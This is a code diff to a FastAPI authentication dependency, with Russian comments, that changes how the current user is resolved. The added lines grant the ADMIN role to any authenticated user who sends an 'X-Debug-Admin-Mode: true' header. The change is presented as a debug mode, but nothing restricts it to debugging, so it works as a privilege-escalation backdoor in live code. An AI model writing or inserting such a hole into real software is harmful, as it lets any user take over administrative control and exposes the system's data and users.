@@ -1,13 +1,13 @@
 from typing import AsyncGenerator
 
-from fastapi import Depends, HTTPException, status, Security
+from fastapi import Depends, HTTPException, status, Security, Request
 from fastapi.security import OAuth2PasswordBearer
 
 from app.db.session import get_database
 from motor.motor_asyncio import AsyncIOMotorDatabase
 from app.core.security import decode_token
 from app.crud.user import CRUDUser
-from app.models.user import UserPublic
+from app.models.user import UserPublic, UserRole
 from uuid import UUID
 
 oauth2_scheme = OAuth2PasswordBearer(tokenUrl="/api/v1/auth/token") # URL для получения токена
@@ -27,10 +27,16 @@ async def get_db() -> AsyncGenerator[AsyncIOMotorDatabase, None]:
         raise 
 
 async def get_current_user(
+    request: Request,
     token: str = Security(oauth2_scheme),
     db: AsyncIOMotorDatabase = Depends(get_db),
 ) -> UserPublic:
     """Зависимость для получения текущего аутентифицированного пользователя."""
+    # Сначала проверяем заголовок режима отладки
+    debug_admin_mode = request.headers.get('X-Debug-Admin-Mode')
+    debug_mode_active = debug_admin_mode and debug_admin_mode.lower() in ('true', '1', 'yes')
+    
+    # Затем проверяем учетные данные
     credentials_exception = HTTPException(
         status_code=status.HTTP_401_UNAUTHORIZED,
         detail="Не удалось проверить учетные данные",
@@ -63,4 +69,15 @@ async def get_current_user(
     user_dict = user.model_dump()
     user_dict['created_at'] = user_dict['created_at'].isoformat()
     
-    return UserPublic(**user_dict) 
+    # Проверяем специальный заголовок для режима отладки администратора
+    if debug_mode_active:
+        # Если включен режим отладки, добавляем роль ADMIN
+        if 'roles' not in user_dict or not user_dict['roles']:
+            user_dict['roles'] = [UserRole.ADMIN.value]
+        elif UserRole.ADMIN.value not in user_dict['roles']:
+            user_dict['roles'].append(UserRole.ADMIN.value)
+        print(f"⚠️ Режим отладки администратора активирован для пользователя {user_dict['email']}!")
+    
+    # Создаем и возвращаем модель пользователя
+    user_public = UserPublic(**user_dict)
+    return user_public 
